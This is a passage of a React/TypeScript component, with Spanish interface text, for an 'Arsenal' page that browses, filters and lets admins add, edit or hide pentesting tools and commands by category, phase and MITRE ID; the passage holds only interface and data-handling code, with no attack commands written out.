  const [desc, setDesc]         = useState('')
  const [cat, setCat]           = useState(defaultCat)
  const [kali, setKali]         = useState<'yes'|'partial'|'no'>('no')

  const autoKey = (l: string) => l.toLowerCase().replace(/[^a-z0-9]+/g, '_').replace(/^_|_$/g, '')
  const handleLabel = (v: string) => { setLabel(v); setKeyName(autoKey(v)) }

  return (
    <div className='space-y-3 p-4 rounded-lg border border-red-900/40 bg-zinc-900/80'>
      <div className='flex items-center justify-between'>
        <span className='text-xs font-semibold text-zinc-300'>Nueva herramienta</span>
        <button onClick={onCancel} className='text-zinc-500 hover:text-zinc-300'><X className='h-4 w-4' /></button>
      </div>
      <div className='grid grid-cols-2 gap-2'>
        <div className='col-span-2 space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Nombre *</label>
          <Input value={label} onChange={e => handleLabel(e.target.value)} placeholder='Ej: Katana' className='h-7 text-xs bg-zinc-950 border-zinc-700' />
        </div>
        <div className='col-span-2 space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Key (ID único)</label>
          <Input value={keyName} onChange={e => setKeyName(autoKey(e.target.value))} className='h-7 text-xs font-mono bg-zinc-950 border-zinc-700' />
        </div>
        <div className='col-span-2 space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Descripción</label>
          <Input value={desc} onChange={e => setDesc(e.target.value)} placeholder='Para qué sirve...' className='h-7 text-xs bg-zinc-950 border-zinc-700' />
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Categoría</label>
          <select value={cat} onChange={e => setCat(e.target.value)}
            className='h-7 w-full rounded-md border border-zinc-700 bg-zinc-950 px-2 text-xs text-zinc-200'>
            {ARSENAL_CATS.map(c => <option key={c.id} value={c.id}>{c.label}</option>)}
          </select>
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>En Kali</label>
          <select value={kali} onChange={e => setKali(e.target.value as 'yes'|'partial'|'no')}
            className='h-7 w-full rounded-md border border-zinc-700 bg-zinc-950 px-2 text-xs text-zinc-200'>
            <option value='yes'>✓ Sí, incluida</option>
            <option value='partial'>⚠ Parcial / instalar</option>
            <option value='no'>✗ No incluida</option>
          </select>
        </div>
      </div>
      <div className='flex gap-2 justify-end'>
        <Button size='sm' variant='ghost' onClick={onCancel} className='h-7 text-xs'>Cancelar</Button>
        <Button size='sm' onClick={() => onSave({ key_name: keyName, label, description: desc||null, arsenal_cat: cat, kali })}
          disabled={saving || !label.trim() || !keyName.trim()} className='h-7 text-xs'>
          {saving ? 'Guardando...' : 'Agregar herramienta'}
        </Button>
      </div>
    </div>
  )
}

// ─── Componente principal ─────────────────────────────────────────────────────
export function Comandos({ initialTool }: ComandosProps) {
  const { auth } = useAuthStore()
  const isAdmin = auth.user?.role === 'admin'

  const [search, setSearch] = useState('')
  const [selectedTool, setSelectedTool] = useState<string>(initialTool || '')
  const [selectedPhase, setSelectedPhase] = useState<Phase | ''>('')
  const [expandedCats, setExpandedCats] = useState<Set<string>>(new Set(['cat1', 'cat2', 'cat3']))

  // Custom DB data
  const [customTools, setCustomTools]       = useState<CustomTool[]>([])
  const [customCmds, setCustomCmds]         = useState<CustomCmd[]>([])
  const [loadingCustom, setLoadingCustom]   = useState(true)

  // Built-in overrides (admin edit/delete of hardcoded commands)
  const [cmdOverrides, setCmdOverrides]     = useState<Record<string, Partial<Comando>>>({})
  const [hiddenCmdIds, setHiddenCmdIds]     = useState<Set<string>>(new Set())

  // Add / edit UI state
  const [addToolCat, setAddToolCat]         = useState<string | null>(null)
  const [addCmdTool, setAddCmdTool]         = useState<string | null>(null)
  const [editCmd, setEditCmd]               = useState<{ cmd: Comando; isBuiltin: boolean } | null>(null)
  const [formSaving, setFormSaving]         = useState(false)

  const loadCustom = async () => {
    try {
      const [tools, cmds, overrides] = await Promise.all([
        apiFetch<CustomTool[]>('/arsenal/tools'),
        apiFetch<CustomCmd[]>('/arsenal/commands'),
        apiFetch<Array<{ item_id: string; hidden: number } & Partial<Comando>>>('/arsenal/cmd-overrides'),
      ])
      setCustomTools(tools)
      setCustomCmds(cmds)
      const hidden = new Set<string>()
      const ovrs: Record<string, Partial<Comando>> = {}
      overrides.forEach(r => {
        if (r.hidden) { hidden.add(r.item_id) }
        else { ovrs[r.item_id] = { title: r.title, command: r.command, description: r.description ?? '', phase: r.phase, category: r.category, tags: r.tags ?? [], notes: r.notes, mitreId: (r as unknown as Record<string, string>)['mitre_id'] } }
      })
      setHiddenCmdIds(hidden)
      setCmdOverrides(ovrs)
    } catch { /* silencioso */ } finally { setLoadingCustom(false) }
  }

  useEffect(() => { loadCustom() }, [])

  useEffect(() => {
    if (initialTool) setSelectedTool(initialTool)
  }, [initialTool])

  const toggleCat = (id: string) =>
    setExpandedCats(prev => {
      const next = new Set(prev)
      next.has(id) ? next.delete(id) : next.add(id)
      return next
    })

  // Merge static + custom tool metadata
  const allToolMeta = useMemo<Record<string, ToolMeta>>(() => {
    const extra: Record<string, ToolMeta> = {}
    customTools.forEach(t => {
      extra[t.key_name] = {
        label: t.label,
        description: t.description ?? '',
        arsenalCat: t.arsenal_cat as ArsenalCatId,
        kali: t.kali,
        mitreIds: [],
      }
    })
    return { ...TOOL_META, ...extra }
  }, [customTools])

  // Merge static + overrides + custom commands
  const allComandos = useMemo<Comando[]>(() => {
    const builtins = COMANDOS
      .filter(c => !hiddenCmdIds.has(c.id))
      .map(c => {
        const ovr = cmdOverrides[c.id]
        return ovr ? { ...c, ...ovr, isModified: true } : c
      })
    const mapped: Comando[] = customCmds.map(c => ({
      id: `custom_${c.id}`,
      tool: c.tool_key,
      phase: c.phase,
      category: c.category,
      title: c.title,
      command: c.command,
      description: c.description ?? '',
      tags: c.tags,
      notes: c.notes ?? undefined,
      mitreId: c.mitre_id ?? undefined,
      isCustom: true,
    }))
    return [...builtins, ...mapped]
  }, [customCmds, cmdOverrides, hiddenCmdIds])

  const isCustomCmd = (id: string) => id.startsWith('custom_')
  const getCustomCmd = (id: string) => customCmds.find(c => `custom_${c.id}` === id)

  const filtered = useMemo(() => {
    let list = allComandos
    if (selectedTool) list = list.filter(c => c.tool === selectedTool)
    if (selectedPhase) list = list.filter(c => c.phase === selectedPhase)
    if (search.trim()) {
      const q = search.toLowerCase()
      list = list.filter(c =>
        c.title.toLowerCase().includes(q) ||
        c.command.toLowerCase().includes(q) ||
        c.description.toLowerCase().includes(q) ||
        c.tags.some(t => t.includes(q)) ||
        c.tool.toLowerCase().includes(q) ||
        (allToolMeta[c.tool]?.label.toLowerCase().includes(q))
      )
    }
    return list
  }, [allComandos, selectedTool, selectedPhase, search, allToolMeta])

  // Tools visible in sidebar (ignore selectedTool so all stay visible)
  const sidebarTools = useMemo(() => {
    let list = allComandos
    if (selectedPhase) list = list.filter(c => c.phase === selectedPhase)
    if (search.trim()) {
      const q = search.toLowerCase()
      list = list.filter(c =>
        c.title.toLowerCase().includes(q) ||
        c.command.toLowerCase().includes(q) ||
        c.description.toLowerCase().includes(q) ||
        c.tags.some(t => t.includes(q)) ||
        c.tool.toLowerCase().includes(q) ||
        (allToolMeta[c.tool]?.label.toLowerCase().includes(q))
      )
    }
    // Also include custom tools even if they have no commands yet
    const toolsWithCmds = new Set(list.map(c => c.tool))
    customTools.forEach(t => toolsWithCmds.add(t.key_name))
    return toolsWithCmds
  }, [allComandos, customTools, selectedPhase, search, allToolMeta])

  const rightRef = useRef<HTMLDivElement>(null)
  useEffect(() => {
    rightRef.current?.scrollTo({ top: 0, behavior: 'smooth' })
  }, [selectedTool])

  const currentMeta = selectedTool ? allToolMeta[selectedTool] : null

  // ── Custom tool actions ──────────────────────────────────────────────────────
  const saveNewTool = async (data: Omit<CustomTool, 'id'>) => {
    setFormSaving(true)
    try {
      const tool = await apiFetch<CustomTool>('/arsenal/tools', { method: 'POST', body: data })
      setCustomTools(prev => [...prev, tool])
      setAddToolCat(null)
      toast.success(`Herramienta "${tool.label}" agregada`)
    } catch (e: unknown) { toast.error(e instanceof Error ? e.message : 'Error al guardar') }
    finally { setFormSaving(false) }
  }

  const deleteTool = async (tool: CustomTool) => {
    if (!confirm(`¿Eliminar "${tool.label}" y todos sus comandos custom?`)) return
    try {
      await apiFetch(`/arsenal/tools/${tool.id}`, { method: 'DELETE' })
      setCustomTools(prev => prev.filter(t => t.id !== tool.id))
      setCustomCmds(prev => prev.filter(c => c.tool_key !== tool.key_name))
      if (selectedTool === tool.key_name) setSelectedTool('')
      toast.success('Herramienta eliminada')
    } catch (e: unknown) { toast.error(e instanceof Error ? e.message : 'Error al eliminar') }
  }

  // ── Command actions (built-in + custom) ──────────────────────────────────────
  const saveNewCmd = async (data: Partial<CustomCmd>) => {
    setFormSaving(true)
    try {
      const cmd = await apiFetch<CustomCmd>('/arsenal/commands', { method: 'POST', body: data })
      setCustomCmds(prev => [...prev, cmd])
      setAddCmdTool(null)
      toast.success('Comando agregado')
    } catch (e: unknown) { toast.error(e instanceof Error ? e.message : 'Error al guardar') }
    finally { setFormSaving(false) }
  }

  const saveEditCmd = async (data: Partial<CustomCmd>) => {
    if (!editCmd) return
    setFormSaving(true)
    try {
      if (editCmd.isBuiltin) {
        // Built-in: store override in DB
        const updated = await apiFetch<Record<string, unknown>>(`/arsenal/cmd-overrides/${editCmd.cmd.id}`, { method: 'PUT', body: { ...data, mitre_id: data.mitre_id ?? data.mitreId } })
        setCmdOverrides(prev => ({ ...prev, [editCmd.cmd.id]: { title: updated.title as string, command: updated.command as string, description: updated.description as string ?? '', phase: updated.phase as Phase, category: updated.category as string, tags: updated.tags as string[] ?? [], notes: updated.notes as string, mitreId: updated.mitre_id as string } }))
        toast.success('Comando actualizado')
      } else {
        // Custom: update in arsenal_commands
        const customId = editCmd.cmd.id.replace('custom_', '')
        const updated = await apiFetch<CustomCmd>(`/arsenal/commands/${customId}`, { method: 'PUT', body: data })
        setCustomCmds(prev => prev.map(c => c.id === customId ? updated : c))
        toast.success('Comando actualizado')
      }
      setEditCmd(null)
    } catch (e: unknown) { toast.error(e instanceof Error ? e.message : 'Error al guardar') }
    finally { setFormSaving(false) }
  }

  const deleteCmd = async (cmd: Comando) => {
    if (!confirm(`¿Eliminar "${cmd.title}"?`)) return
    try {
      if (cmd.isCustom) {
        const customId = cmd.id.replace('custom_', '')
        await apiFetch(`/arsenal/commands/${customId}`, { method: 'DELETE' })
        setCustomCmds(prev => prev.filter(c => c.id !== customId))
      } else {
        await apiFetch(`/arsenal/cmd-overrides/${cmd.id}`, { method: 'DELETE' })
        setHiddenCmdIds(prev => new Set([...prev, cmd.id]))
        setCmdOverrides(prev => { const n = {...prev}; delete n[cmd.id]; return n })
      }
      if (editCmd?.cmd.id === cmd.id) setEditCmd(null)
      toast.success('Comando eliminado')
    } catch (e: unknown) { toast.error(e instanceof Error ? e.message : 'Error al eliminar') }
  }

  return (
    <div className='flex h-[calc(100vh-4rem)] -m-6 overflow-hidden'>
      {/* ── Left sidebar ──────────────────────────────────────────────────── */}
      <div className='flex w-72 shrink-0 flex-col border-r border-zinc-800 overflow-hidden'>
        {/* Header + search */}
        <div className='border-b border-zinc-800 p-4 space-y-3'>
          <div className='flex items-center gap-2'>
            <Terminal className='h-4 w-4 text-red-500' />
            <h1 className='font-semibold text-sm text-zinc-200'>Arsenal</h1>
            <span className='ml-auto text-xs text-zinc-500'>{allComandos.length} cmds</span>
          </div>
          <div className='relative'>
            <Search className='absolute left-2.5 top-2.5 h-3.5 w-3.5 text-zinc-500' />
            <Input placeholder='Buscar herramienta o comando...' value={search}
              onChange={e => setSearch(e.target.value)}
              className='h-8 pl-8 text-xs bg-zinc-950 border-zinc-800' />
          </div>
        </div>

        {/* Phase filters */}
        <div className='border-b border-zinc-800 px-3 py-2'>
          <div className='flex flex-wrap gap-1'>
            <button onClick={() => setSelectedPhase('')}
              className={cn('rounded px-2 py-0.5 text-[10px] transition',
                selectedPhase === '' ? 'bg-zinc-700 text-zinc-200' : 'text-zinc-500 hover:text-zinc-300')}
            >Todas</button>
            {(Object.keys(PHASE_LABELS) as Phase[]).map(p => (
              <button key={p} onClick={() => setSelectedPhase(p === selectedPhase ? '' : p)}
                className={cn('rounded border px-2 py-0.5 text-[10px] transition',
                  selectedPhase === p ? PHASE_COLORS[p] + ' opacity-100' : 'border-transparent text-zinc-500 hover:text-zinc-300')}
              >{PHASE_LABELS[p]}</button>
            ))}
          </div>
        </div>

        {/* "Todas" button */}
        <div className='px-2 pt-2'>
          <button onClick={() => setSelectedTool('')}
            className={cn('flex w-full items-center gap-2 rounded-md px-3 py-1.5 text-xs transition',
              selectedTool === '' ? 'bg-zinc-800 text-zinc-100' : 'text-zinc-400 hover:bg-zinc-900 hover:text-zinc-200')}
          >
            <span className='flex-1 text-left font-medium'>Todas las herramientas</span>
            <span className='rounded bg-zinc-700 px-1.5 py-0.5 text-[10px] text-zinc-400'>{filtered.length}</span>
          </button>
        </div>

        {/* Category tree */}
        <div className='flex-1 overflow-y-auto py-2 space-y-0.5'>
          {ARSENAL_CATS.map(cat => {
            const catTools = Object.entries(allToolMeta)
              .filter(([k, m]) => m.arsenalCat === cat.id && sidebarTools.has(k))
              .sort(([, a], [, b]) => a.label.localeCompare(b.label))
            if (catTools.length === 0 && !isAdmin) return null
            const expanded = expandedCats.has(cat.id)
            return (
              <div key={cat.id}>
                <button onClick={() => toggleCat(cat.id)}
                  className='group flex w-full items-center gap-1.5 px-3 py-1.5 text-[10px] font-semibold uppercase tracking-wide text-zinc-500 hover:text-zinc-300 transition'>
                  {expanded ? <ChevronDown className='h-3 w-3 shrink-0' /> : <ChevronRight className='h-3 w-3 shrink-0' />}
                  <span className='flex-1 text-left truncate'>{cat.label}</span>
                  {isAdmin && (
                    <span onClick={e => { e.stopPropagation(); setAddToolCat(cat.id); setExpandedCats(prev => new Set([...prev, cat.id])) }}
                      className='opacity-0 group-hover:opacity-100 rounded p-0.5 hover:bg-zinc-700 transition text-zinc-500 hover:text-zinc-200'
                      title='Agregar herramienta'>
                      <Plus className='h-2.5 w-2.5' />
                    </span>
                  )}
                  <span className='text-zinc-700 ml-1'>{catTools.length}</span>
                </button>

                {expanded && (
                  <>
                    {/* Add tool form inline */}
                    {isAdmin && addToolCat === cat.id && (
                      <div className='mx-2 mb-2'>
                        <ToolForm defaultCat={cat.id} saving={formSaving}
                          onCancel={() => setAddToolCat(null)}
                          onSave={saveNewTool} />
                      </div>
                    )}

                    {catTools.map(([toolKey, meta]) => {
                      const count = allComandos.filter(c => c.tool === toolKey).length
                      const active = selectedTool === toolKey
                      const kb = KALI_BADGE[meta.kali]
                      const isCustomTool = customTools.some(t => t.key_name === toolKey)
                      return (
                        <div key={toolKey} className='group/tool flex items-center'>
                          <button onClick={() => setSelectedTool(active ? '' : toolKey)}
                            className={cn(
                              'flex flex-1 items-center gap-2 rounded-md pl-7 pr-2 py-1.5 text-xs transition min-w-0',
                              active ? 'bg-red-950/50 border border-red-900/50 text-red-300' : 'text-zinc-400 hover:bg-zinc-900 hover:text-zinc-200'
                            )}>
                            <span className='flex-1 text-left truncate'>{meta.label}</span>
                            {isCustomTool && <span className='text-[8px] text-red-500/70 shrink-0'>✦</span>}
                            <span className={cn('text-[9px] font-mono shrink-0', kb.cls)}>{kb.label}</span>
                            <span className={cn('rounded px-1 py-0.5 text-[10px] shrink-0',
                              active ? 'bg-red-900/50 text-red-400' : 'bg-zinc-800 text-zinc-600')}>{count}</span>
                          </button>
                          {isAdmin && isCustomTool && (
                            <button
                              onClick={() => deleteTool(customTools.find(t => t.key_name === toolKey)!)}
                              className='shrink-0 opacity-0 group-hover/tool:opacity-100 mr-2 p-1 rounded text-zinc-600 hover:text-red-400 hover:bg-red-900/20 transition'
                              title='Eliminar herramienta'>
                              <Trash2 className='h-3 w-3' />
                            </button>
                          )}
                        </div>
                      )
                    })}
                  </>
                )}
              </div>
            )
          })}
        </div>
      </div>

      {/* ── Right panel ───────────────────────────────────────────────────── */}
      <div ref={rightRef} className='flex-1 overflow-y-auto'>
        {/* Tool header */}
        {currentMeta ? (
          <div className='sticky top-0 z-10 border-b border-zinc-800 bg-zinc-950/95 px-6 py-4 backdrop-blur'>
            <div className='flex items-center gap-3'>
              <div>
                <h2 className='font-semibold text-zinc-100'>{currentMeta.label}</h2>
                <p className='text-xs text-zinc-500'>{currentMeta.description}</p>
              </div>
              <div className='ml-auto flex items-center gap-2'>
                {currentMeta.mitreIds?.map(id => (
                  <Link key={id} to='/tecnicas' search={{ mitre: id }}
                    className='flex items-center gap-1 rounded border border-zinc-700 px-2 py-1 text-[10px] text-zinc-400 hover:border-red-800 hover:text-red-400 transition'>
                    <ExternalLink className='h-2.5 w-2.5' />{id}
                  </Link>
                ))}
                {isAdmin && (
                  <Button size='sm' variant='outline'
                    className='h-7 text-xs border-zinc-700 text-zinc-400 hover:text-zinc-200 hover:border-zinc-500'
                    onClick={() => { setAddCmdTool(selectedTool); setEditCmd(null) }}>
                    <Plus className='h-3 w-3 mr-1' /> Agregar comando
                  </Button>
                )}
              </div>
            </div>
          </div>
        ) : (
          <div className='sticky top-0 z-10 border-b border-zinc-800 bg-zinc-950/95 px-6 py-4 backdrop-blur'>
            <div className='flex items-center justify-between'>
              <div>
                <h2 className='font-semibold text-zinc-100'>Arsenal de comandos</h2>
                <p className='text-xs text-zinc-500'>
                  {filtered.length} comando{filtered.length !== 1 ? 's' : ''}
                  {search && ` para "${search}"`}
                  {selectedPhase && ` · fase: ${PHASE_LABELS[selectedPhase]}`}
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Commands grid */}
        <div className='p-6'>
          {/* Inline add-command form */}
          {isAdmin && addCmdTool && addCmdTool === selectedTool && !editCmd && (
            <div className='mb-6'>
              <CmdForm toolKey={addCmdTool} allToolMeta={allToolMeta} saving={formSaving}
                onCancel={() => setAddCmdTool(null)} onSave={saveNewCmd} />
            </div>
          )}
          {/* Inline edit-command form */}
          {isAdmin && editCmd && (
            <div className='mb-6'>
              <CmdForm toolKey={editCmd.cmd.tool} allToolMeta={allToolMeta}
                initial={{ title: editCmd.cmd.title, command: editCmd.cmd.command, description: editCmd.cmd.description, phase: editCmd.cmd.phase, category: editCmd.cmd.category, notes: editCmd.cmd.notes, mitreId: editCmd.cmd.mitreId, tags: editCmd.cmd.tags }}
                saving={formSaving}
                onCancel={() => setEditCmd(null)} onSave={saveEditCmd} />
            </div>
          )}

          {filtered.length === 0 && !addCmdTool ? (
            <div className='flex flex-col items-center justify-center py-24 text-center'>
              <Terminal className='mb-3 h-8 w-8 text-zinc-700' />
              <p className='text-sm text-zinc-500'>No se encontraron comandos</p>
              {isAdmin && selectedTool && <p className='text-xs text-zinc-700 mt-1'>Usá "Agregar comando" para añadir el primero.</p>}
            </div>
          ) : selectedTool ? (
            (() => {
              const byCategory = filtered.reduce<Record<string, Comando[]>>((acc, c) => {
                if (!acc[c.category]) acc[c.category] = []
                acc[c.category].push(c)
                return acc
              }, {})
              return (
                <div className='space-y-8'>
                  {Object.entries(byCategory).map(([cat, cmds]) => (
                    <div key={cat}>
                      <h3 className='mb-3 text-xs font-semibold uppercase tracking-wider text-zinc-600 border-b border-zinc-800 pb-1.5'>{cat}</h3>
                      <div className='grid gap-3 sm:grid-cols-1 lg:grid-cols-2 xl:grid-cols-2'>
                        {cmds.map(cmd => {
                          const custom = isCustomCmd(cmd.id) ? getCustomCmd(cmd.id) : undefined
                          return (
                            <ComandoCard key={cmd.id} cmd={cmd} isCustom={!!custom} isModified={!!cmd.isModified}
                              onEdit={isAdmin ? () => { setEditCmd({ cmd, isBuiltin: !cmd.isCustom }); setAddCmdTool(null) } : undefined}
                              onDelete={isAdmin ? () => deleteCmd(cmd) : undefined} />
                          )
                        })}
                      </div>
                    </div>
                  ))}
                </div>
              )
            })()
          ) : (
            (() => {
              const byTool = filtered.reduce<Record<string, Comando[]>>((acc, c) => {
                if (!acc[c.tool]) acc[c.tool] = []
                acc[c.tool].push(c)
                return acc
              }, {})
              return (
                <div className='space-y-10'>
                  {Object.entries(byTool).map(([tool, cmds]) => {
                    const meta = allToolMeta[tool]
                    return (
                      <div key={tool}>
                        <div className='mb-4 flex items-baseline gap-3'>
                          <h3 className='text-sm font-semibold text-zinc-300'>{meta?.label ?? tool}</h3>
                          <span className='text-xs text-zinc-600'>{meta?.description}</span>
                          <button onClick={() => setSelectedTool(tool)}
                            className='ml-auto text-[10px] text-zinc-600 hover:text-red-400 transition'>ver todos →</button>
                        </div>
                        <div className='grid gap-3 sm:grid-cols-1 lg:grid-cols-2 xl:grid-cols-2'>
                          {cmds.slice(0, 4).map(cmd => {
                            const custom = isCustomCmd(cmd.id) ? getCustomCmd(cmd.id) : undefined
                            return (
                              <ComandoCard key={cmd.id} cmd={cmd} isCustom={!!custom} isModified={!!cmd.isModified}
                                onEdit={isAdmin ? () => { setSelectedTool(tool); setTimeout(() => setEditCmd({ cmd, isBuiltin: !cmd.isCustom }), 50) } : undefined}
                                onDelete={isAdmin ? () => deleteCmd(cmd) : undefined} />
                            )
                          })}
                        </div>
                        {cmds.length > 4 && (
                          <button onClick={() => setSelectedTool(tool)} className='mt-2 text-xs text-zinc-600 hover:text-zinc-400 transition'>
                            + {cmds.length - 4} más en {meta?.label ?? tool}
                          </button>
                        )}
                      </div>
                    )
                  })}
                </div>
              )
            })()
          )}
        </div>
      </div>
    </div>
  )
}
